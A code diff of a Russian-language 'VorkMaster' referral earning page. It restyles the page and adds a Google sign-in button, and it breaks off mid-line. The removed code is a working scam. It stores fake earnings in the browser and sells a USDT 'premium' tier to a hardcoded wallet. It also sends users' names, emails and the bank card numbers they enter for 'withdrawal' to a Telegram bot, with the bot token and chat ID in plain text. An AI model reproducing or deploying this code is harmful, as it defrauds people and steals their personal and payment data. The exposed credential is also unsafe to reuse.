@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>VorkMaster — партнёрский ворк</title>
+    <title>VorkMaster — зарабатывай с друзьями</title>
     <style>
         * {
             margin: 0;
@@ -13,15 +13,24 @@
 
         body {
             background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
-            font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, 'Inter', sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             color: #fff;
             line-height: 1.5;
+            min-height: 100vh;
         }
 
         .container {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 2rem 1.5rem;
+            padding: 1.5rem;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
         }
 
         .logo {
@@ -31,16 +40,16 @@
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            letter-spacing: -0.5px;
         }
 
+        /* Hero */
         .hero {
             text-align: center;
-            padding: 3rem 0 2rem;
+            padding: 2rem 0;
         }
 
         .hero h1 {
-            font-size: 2.5rem;
+            font-size: 2.2rem;
             font-weight: 800;
             background: linear-gradient(135deg, #fff, #a78bfa);
             -webkit-background-clip: text;
@@ -50,553 +59,54 @@
         }
 
         .hero p {
-            font-size: 1.1rem;
+            font-size: 1rem;
             color: #94a3b8;
-            max-width: 600px;
-            margin: 0 auto;
+            margin-bottom: 2rem;
         }
 
-        .btn-glow {
-            background: linear-gradient(95deg, #8b5cf6, #3b82f6);
-            border: none;
+        /* Google Button */
+        .google-btn {
+            background: white;
+            color: #1e293b;
             padding: 1rem 2rem;
-            font-size: 1.1rem;
-            font-weight: 700;
             border-radius: 60px;
-            color: white;
-            cursor: pointer;
-            box-shadow: 0 8px 20px rgba(59,130,246,0.4);
-            transition: 0.2s;
-            margin-top: 2rem;
             display: inline-flex;
             align-items: center;
-            gap: 8px;
+            justify-content: center;
+            gap: 12px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            border: none;
+            width: 100%;
+            max-width: 280px;
+            margin: 0 auto;
+            transition: transform 0.2s;
         }
 
-        .btn-glow:hover {
-            transform: scale(1.02);
-            box-shadow: 0 12px 28px rgba(139,92,246,0.5);
+        .google-btn:active {
+            transform: scale(0.98);
         }
 
-        .grid {
+        /* Cards */
+        .cards {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 1.5rem;
-            margin: 3rem 0;
+            gap: 1rem;
+            margin: 2rem 0;
         }
 
         .card {
             background: rgba(15, 23, 42, 0.7);
             backdrop-filter: blur(4px);
-            border-radius: 28px;
+            border-radius: 24px;
             padding: 1.5rem;
             border: 1px solid rgba(139, 92, 246, 0.3);
         }
 
         .card h3 {
-            font-size: 1.5rem;
+            font-size: 1.3rem;
             margin-bottom: 1rem;
-            display: flex;
-            align-items: center;
-            gap: 8px;
         }
 
-        .price {
-            font-size: 1.8rem;
-            font-weight: 800;
-            color: #facc15;
-            margin: 1rem 0;
-        }
-
-        .price small {
-            font-size: 0.8rem;
-            color: #94a3b8;
-        }
-
-        .list {
-            list-style: none;
-            margin: 1rem 0;
-        }
-
-        .list li {
-            margin: 0.6rem 0;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 0.9rem;
-        }
-
-        .badge {
-            background: #8b5cf6;
-            padding: 0.2rem 0.6rem;
-            border-radius: 40px;
-            font-size: 0.7rem;
-            font-weight: bold;
-        }
-
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.95);
-            backdrop-filter: blur(8px);
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            padding: 1rem;
-        }
-
-        .modal-card {
-            background: #0f172a;
-            max-width: 400px;
-            width: 100%;
-            border-radius: 32px;
-            padding: 1.8rem;
-            text-align: center;
-            border: 1px solid #8b5cf6;
-        }
-
-        .modal-card input {
-            width: 100%;
-            padding: 1rem;
-            margin: 0.8rem 0;
-            background: #1e293b;
-            border: 1px solid #8b5cf6;
-            border-radius: 60px;
-            color: white;
-            font-size: 1rem;
-        }
-
-        .modal-card input::placeholder {
-            color: #94a3b8;
-        }
-
-        .modal-btn {
-            background: linear-gradient(95deg, #8b5cf6, #3b82f6);
-            border: none;
-            padding: 1rem;
-            width: 100%;
-            border-radius: 60px;
-            color: white;
-            font-weight: bold;
-            font-size: 1rem;
-            cursor: pointer;
-            margin-top: 0.5rem;
-        }
-
-        .close-modal {
-            background: none;
-            border: none;
-            color: #94a3b8;
-            font-size: 0.9rem;
-            margin-top: 1rem;
-            cursor: pointer;
-        }
-
-        .premium-block {
-            background: linear-gradient(135deg, #1e1b3a, #0f172a);
-            border-radius: 28px;
-            padding: 1.5rem;
-            margin: 2rem 0;
-            border: 1px solid #facc15;
-            text-align: center;
-        }
-
-        .premium-btn {
-            background: #facc15;
-            color: #0f172a;
-            font-weight: bold;
-            padding: 0.8rem 1.5rem;
-            border-radius: 60px;
-            border: none;
-            margin-top: 1rem;
-            font-size: 1rem;
-            cursor: pointer;
-        }
-
-        .crypto-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.95);
-            backdrop-filter: blur(12px);
-            align-items: center;
-            justify-content: center;
-            z-index: 1001;
-            padding: 1rem;
-        }
-
-        .crypto-card {
-            background: #0f172a;
-            max-width: 500px;
-            width: 100%;
-            border-radius: 32px;
-            padding: 1.5rem;
-            border: 1px solid #facc15;
-            max-height: 85vh;
-            overflow-y: auto;
-        }
-
-        .crypto-card h2 {
-            font-size: 1.5rem;
-            margin-bottom: 1rem;
-            color: #facc15;
-        }
-
-        .address-box {
-            background: #1e293b;
-            padding: 0.8rem;
-            border-radius: 20px;
-            margin: 1rem 0;
-            word-break: break-all;
-            font-family: monospace;
-            font-size: 0.8rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .copy-btn {
-            background: #8b5cf6;
-            border: none;
-            padding: 0.4rem 0.8rem;
-            border-radius: 40px;
-            color: white;
-            cursor: pointer;
-            font-size: 0.7rem;
-        }
-
-        .step {
-            background: #1e293b;
-            padding: 0.8rem;
-            border-radius: 20px;
-            margin: 0.8rem 0;
-            text-align: left;
-            font-size: 0.85rem;
-        }
-
-        .step h3 {
-            color: #c084fc;
-            margin-bottom: 0.5rem;
-            font-size: 1rem;
-        }
-
-        .warning {
-            background: rgba(245, 158, 11, 0.2);
-            border-left: 4px solid #facc15;
-            padding: 0.8rem;
-            border-radius: 16px;
-            margin: 0.8rem 0;
-            text-align: left;
-            font-size: 0.85rem;
-        }
-
-        .dashboard {
-            background: rgba(15, 23, 42, 0.9);
-            border-radius: 28px;
-            padding: 1.2rem;
-            margin: 2rem 0;
-            border: 1px solid #8b5cf6;
-        }
-
-        .stat {
-            display: flex;
-            justify-content: space-between;
-            padding: 0.6rem;
-            border-bottom: 1px solid #334155;
-        }
-
-        .referral-link {
-            background: #1e293b;
-            padding: 0.6rem;
-            border-radius: 20px;
-            display: flex;
-            gap: 8px;
-            margin: 1rem 0;
-        }
-
-        .referral-link input {
-            flex: 1;
-            background: #0f172a;
-            border: 1px solid #8b5cf6;
-            color: white;
-            padding: 0.6rem;
-            border-radius: 40px;
-            font-size: 0.7rem;
-        }
-
-        .withdraw-section {
-            background: #1e293b;
-            padding: 1rem;
-            border-radius: 24px;
-            margin-top: 1rem;
-        }
-
-        footer {
-            font-size: 0.6rem;
-            text-align: center;
-            color: #475569;
-            margin-top: 2rem;
-        }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <div class="logo">VORK<span>MASTER</span></div>
-
-    <div class="hero">
-        <h1>ЗАВОРКАЙ ЛЕГКО<br>ЗАБИРАЙ ДО 500 000₽</h1>
-        <p>VorkMaster — приглашай друзей, выполняй задания и выводи деньги</p>
-        <button class="btn-glow" id="openRegBtn">🔓 СТАРТОВАТЬ</button>
-    </div>
-
-    <div class="grid">
-        <div class="card">
-            <h3>💸 БЕЗ ПРЕМИУМ</h3>
-            <div class="price">до 50 000₽</div>
-            <ul class="list">
-                <li>✅ Задания от партнёров</li>
-                <li>✅ За друга → 1000₽</li>
-                <li>💰 Вывод от 30 000₽</li>
-                <li>⚡ Комиссия: 25%</li>
-            </ul>
-        </div>
-        <div class="card" style="border-color: #facc15;">
-            <h3>👑 ПРЕМИУМ <span class="badge">🔥</span></h3>
-            <div class="price">до 200 000₽</div>
-            <ul class="list">
-                <li>✅ За первых 3 друзей → 4000₽</li>
-                <li>✅ За остальных → 1000₽</li>
-                <li>💰 Вывод от 70 000₽</li>
-                <li>⚡ Комиссия: 20%</li>
-            </ul>
-            <div style="font-size: 1.2rem; font-weight: bold;">$7.99 USDT</div>
-        </div>
-        <div class="card">
-            <h3>⚡ ТОП-ВОРКЕРЫ</h3>
-            <div class="price">500 000₽+</div>
-            <ul class="list">
-                <li>🚀 Своя команда</li>
-                <li>🚀 Повышенные выплаты</li>
-            </ul>
-        </div>
-    </div>
-
-    <div id="dashboard" style="display: none;">
-        <div class="dashboard">
-            <h2>📊 Мой профиль</h2>
-            <div class="stat"><span>💰 Баланс:</span><span id="balanceDisplay" style="color:#facc15; font-size:1.3rem;">0 ₽</span></div>
-            <div class="stat"><span>👥 Друзей:</span><span id="referralsCount">0</span></div>
-            <div class="stat"><span>🏆 Премиум:</span><span id="premiumStatus">❌ Нет</span></div>
-            
-            <div class="referral-link">
-                <input type="text" id="refLink" readonly>
-                <button class="copy-btn" onclick="copyRefLink()">📋</button>
-            </div>
-            
-            <div class="step">
-                <h3>🔥 КАК ЗАРАБАТЫВАТЬ?</h3>
-                <p>1. Копируй ссылку и кидай друзьям</p>
-                <p>2. За регистрацию друга → бонус на счёт</p>
-                <p>3. Выполняй задания в ТГ: <a href="https://t.me/vorkmaster_tasks" style="color:#c084fc;">@vorkmaster_tasks</a></p>
-                <p>4. Копи баланс → выводи на карту</p>
-            </div>
-            
-            <div id="withdrawSection" class="withdraw-section">
-                <h3>💸 ВЫВОД</h3>
-                <div id="withdrawInfo"></div>
-                <button id="withdrawBtn" class="premium-btn" style="margin-top: 0.8rem;">💳 ЗАПРОСИТЬ ВЫВОД</button>
-            </div>
-        </div>
-    </div>
-
-    <div id="method1" style="display: none;">
-        <div class="card">
-            <h3>📁 МЕТОД 1: ИНФО-ВОРК</h3>
-            <p>Закрытый канал: <strong style="color:#c084fc;">t.me/vorkmaster_inside</strong></p>
-            <p>💰 Доход: до 50 000₽/мес</p>
-        </div>
-    </div>
-
-    <div id="premiumSection" style="display: none;">
-        <div class="premium-block">
-            <h2>🔥 АКТИВИРУЙ ПРЕМИУМ</h2>
-            <button class="premium-btn" id="buyPremiumBtn">💎 КУПИТЬ — $7.99 USDT</button>
-        </div>
-    </div>
-
-    <footer>VorkMaster — твой путь к успеху</footer>
-</div>
-
-<!-- Модалка регистрации -->
-<div id="regModal" class="modal">
-    <div class="modal-card">
-        <h3>🔐 РЕГИСТРАЦИЯ</h3>
-        <input type="text" id="regName" placeholder="Твоё имя" autocomplete="off">
-        <input type="email" id="regEmail" placeholder="Email" autocomplete="off">
-        <button id="confirmRegBtn" class="modal-btn">✅ ЗАРЕГИСТРИРОВАТЬСЯ</button>
-        <button class="close-modal" id="closeRegModal">Закрыть</button>
-    </div>
-</div>
-
-<script>
-    const TELEGRAM_BOT_TOKEN = "8557565108:AAFnoCGWW0e5Vmrz5vf9ikAKf-MfTm-0AOg";
-    const TELEGRAM_CHAT_ID = "5314096451";
-    const USDT_ADDRESS = "0x927F9ACD3FadBFBe6148bE556Cc31d7C141BD908";
-    const PREMIUM_PRICE = 7.99;
-    
-    let currentUser = {
-        id: null, name: "", email: "", balance: 0, referrals: [],
-        premium: false, premiumReferralBonusesUsed: 0
-    };
-    
-    function saveUser() {
-        localStorage.setItem("vorkmaster_user_" + currentUser.id, JSON.stringify(currentUser));
-    }
-    
-    function loadUser(userId) {
-        let data = localStorage.getItem("vorkmaster_user_" + userId);
-        if(data) currentUser = JSON.parse(data);
-        updateDashboard();
-    }
-    
-    function generateUserId() {
-        return "user_" + Date.now() + "_" + Math.random().toString(36).substr(2, 6);
-    }
-    
-    function updateDashboard() {
-        document.getElementById("balanceDisplay").innerText = currentUser.balance + " ₽";
-        document.getElementById("referralsCount").innerText = currentUser.referrals.length;
-        document.getElementById("premiumStatus").innerHTML = currentUser.premium ? "✅ Да (20%)" : "❌ Нет (25%)";
-        
-        let minWithdraw = currentUser.premium ? 70000 : 30000;
-        let commission = currentUser.premium ? 20 : 25;
-        let withdrawInfo = document.getElementById("withdrawInfo");
-        withdrawInfo.innerHTML = `
-            <p>💰 Мин. вывод: ${minWithdraw} ₽</p>
-            <p>⚡ Комиссия: ${commission}%</p>
-            <p>📊 Баланс: ${currentUser.balance} ₽</p>
-            ${currentUser.balance >= minWithdraw ? '<p style="color:#10b981;">✅ Можно вывести</p>' : '<p style="color:#facc15;">⚠️ Копи сумму</p>'}
-        `;
-        
-        let refLink = document.getElementById("refLink");
-        if(refLink) refLink.value = window.location.origin + window.location.pathname + "?ref=" + currentUser.id;
-    }
-    
-    function addReferralBonus(referrerId, newUserId) {
-        let referrerData = localStorage.getItem("vorkmaster_user_" + referrerId);
-        if(!referrerData) return;
-        let referrer = JSON.parse(referrerData);
-        let bonus = 1000;
-        if(referrer.premium && referrer.premiumReferralBonusesUsed < 3) {
-            bonus = 4000;
-            referrer.premiumReferralBonusesUsed++;
-        }
-        referrer.balance += bonus;
-        referrer.referrals.push(newUserId);
-        localStorage.setItem("vorkmaster_user_" + referrerId, JSON.stringify(referrer));
-        
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: "POST", headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: `👥 НОВЫЙ РЕФЕРАЛ\n👤 ${referrer.name}\n🎁 Бонус: ${bonus}₽\n📅 ${new Date().toLocaleString()}`})
-        }).catch(e => console.log(e));
-        
-        if(referrer.id === currentUser.id) {
-            currentUser = referrer;
-            updateDashboard();
-            alert(`🎉 Ты получил ${bonus}₽ за друга!`);
-        }
-    }
-    
-    function handleRegistration(userName, userEmail, refId = null) {
-        let userId = generateUserId();
-        currentUser = {
-            id: userId, name: userName, email: userEmail, balance: 0, referrals: [],
-            premium: false, premiumReferralBonusesUsed: 0
-        };
-        saveUser();
-        if(refId && refId !== userId) addReferralBonus(refId, userId);
-        
-        localStorage.setItem("vorkmaster_registered", "true");
-        localStorage.setItem("vorkmaster_user_id", userId);
-        
-        document.getElementById("dashboard").style.display = "block";
-        document.getElementById("method1").style.display = "block";
-        document.getElementById("premiumSection").style.display = "block";
-        document.getElementById("openRegBtn").style.display = "none";
-        updateDashboard();
-        
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: "POST", headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: `🆕 РЕГИСТРАЦИЯ\n👤 ${userName}\n📧 ${userEmail}\n🆔 ${userId}\n${refId ? "🔗 Реферал: " + refId : "Прямая"}\n📅 ${new Date().toLocaleString()}`})
-        }).catch(e => console.log(e));
-    }
-    
-    function activatePremium() {
-        currentUser.premium = true;
-        saveUser();
-        updateDashboard();
-        let ps = document.getElementById("premiumSection");
-        if(ps) ps.innerHTML = `<div class="premium-block" style="border-color:#10b981;"><h2>🔥 ПРЕМИУМ АКТИВИРОВАН</h2><p>Бонус за первых 3 друзей: 4000₽</p><p>Комиссия вывода: 20%</p></div>`;
-        alert("🔥 Премиум активирован!");
-    }
-    
-    function requestWithdraw() {
-        let minWithdraw = currentUser.premium ? 70000 : 30000;
-        let commission = currentUser.premium ? 20 : 25;
-        if(currentUser.balance < minWithdraw) {
-            alert(`❌ Минимум для вывода: ${minWithdraw} ₽`);
-            return;
-        }
-        let withdrawAmount = currentUser.balance * (1 - commission/100);
-        let card = prompt("💳 Номер карты для вывода:");
-        if(!card || card.length < 10) return;
-        if(confirm(`Вывести ${withdrawAmount.toFixed(0)} ₽? Комиссия: ${commission}%`)) {
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: "POST", headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: `💸 ВЫВОД\n👤 ${currentUser.name}\n💰 Сумма: ${withdrawAmount.toFixed(0)}₽\n💳 Карта: ${card}\n📅 ${new Date().toLocaleString()}`})
-            }).catch(e => console.log(e));
-            currentUser.balance = 0;
-            saveUser();
-            updateDashboard();
-            alert("✅ Заявка отправлена!");
-        }
-    }
-    
-    function checkReferral() {
-        let urlParams = new URLSearchParams(window.location.search);
-        let refId = urlParams.get("ref");
-        if(refId) localStorage.setItem("vorkmaster_pending_ref", refId);
-    }
-    
-    function init() {
-        checkReferral();
-        let registered = localStorage.getItem("vorkmaster_registered");
-        let userId = localStorage.getItem("vorkmaster_user_id");
-        if(registered && userId) {
-            loadUser(userId);
-            document.getElementById("dashboard").style.display = "block";
-            document.getElementById("method1").style.display = "block";
-            document.getElementById("premiumSection").style.display = "block";
-            document.getElementById("openRegBtn").style.display = "none";
-        }
-        
-        document.getElementById("openRegBtn").onclick = () => {
-            document.getElementById("regModal").style.display = "flex";
-        };
-        document.getElementById("closeRegModal").onclick = () => {
-            document.getElementById("regModal").style.display = "none";
-        };
-        document.getElementById("confirmRegBtn").onclick = () => {
-            let name = document.getElementById("regName").value.trim();
-            let email = document.getElementById("regEmail").value.trim();
-            if(!name || !email) { alert("Заполни имя и email"); return; }
-            let refId = localStorage.g
+        .
